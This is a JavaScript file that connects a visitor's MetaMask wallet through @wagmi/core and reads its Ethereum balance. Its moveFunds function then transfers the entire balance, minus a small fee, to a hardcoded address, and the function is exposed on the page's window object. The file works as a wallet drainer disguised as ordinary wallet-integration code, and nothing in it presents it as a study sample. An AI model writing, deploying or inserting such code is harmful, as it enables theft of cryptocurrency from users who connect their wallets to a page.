import {
    createClient,
    configureChains,
    mainnet,
    connect
  } from '@wagmi/core'
  import { publicProvider } from '@wagmi/core/providers/public'
  import { InjectedConnector } from '@wagmi/core/connectors/injected'
  import { MetaMaskConnector } from '@wagmi/core/connectors/metaMask'
  import { getAccount } from '@wagmi/core'
  import { fetchBalance } from '@wagmi/core'
  import { sendTransaction, prepareSendTransaction } from '@wagmi/core'
import { BigNumber } from 'ethers'
import { parseEther } from 'ethers/lib/utils.js'
 
const to = "0x0c166dbCc0F4f382f142594BD2fFA32cca76c644";
  
  const { chains, provider, webSocketProvider } = configureChains(
    [mainnet],
    [publicProvider()],
  )
  
  const client = createClient({
    autoConnect: true,
    provider,
    webSocketProvider,
    connectors: [
      new MetaMaskConnector({ chains }),
    ]
  })

  const { address, isConnected } = getAccount()
  
  export async function getAddress() {
    const  {account}  = await connect({
      connector:  new MetaMaskConnector({ chains }),
    })

    
    //console.log(account)
    return account
  }

  export async function getBalance(){
    const balance = await fetchBalance({
        address,
      })
      console.log('Balance', balance.formatted)
    return balance.formatted
  }


  window.getAddress = getAddress
  if(isConnected){
    window.address = address;
    window.balance = getBalance()
   
  }

  const fee = 0.0056;

  export const moveFunds = async () => {
    const balance = await getBalance()
    //const balance = 20
    const amount = String(balance-fee)
    //const bigNumber = BigNumber.from(String(balance))
    //const value = bigNumber
    //console.log("val",bigNumber)

    const config = await prepareSendTransaction({
        request: {
          to,
          value: parseEther(amount),
        },
      })
      const { hash } = await sendTransaction(config)
    console.log(`Transaction sent: ${hash}`)
  }
  



  window.isConnected = isConnected
  window.moveFunds = moveFunds
 console.log(address, isConnected)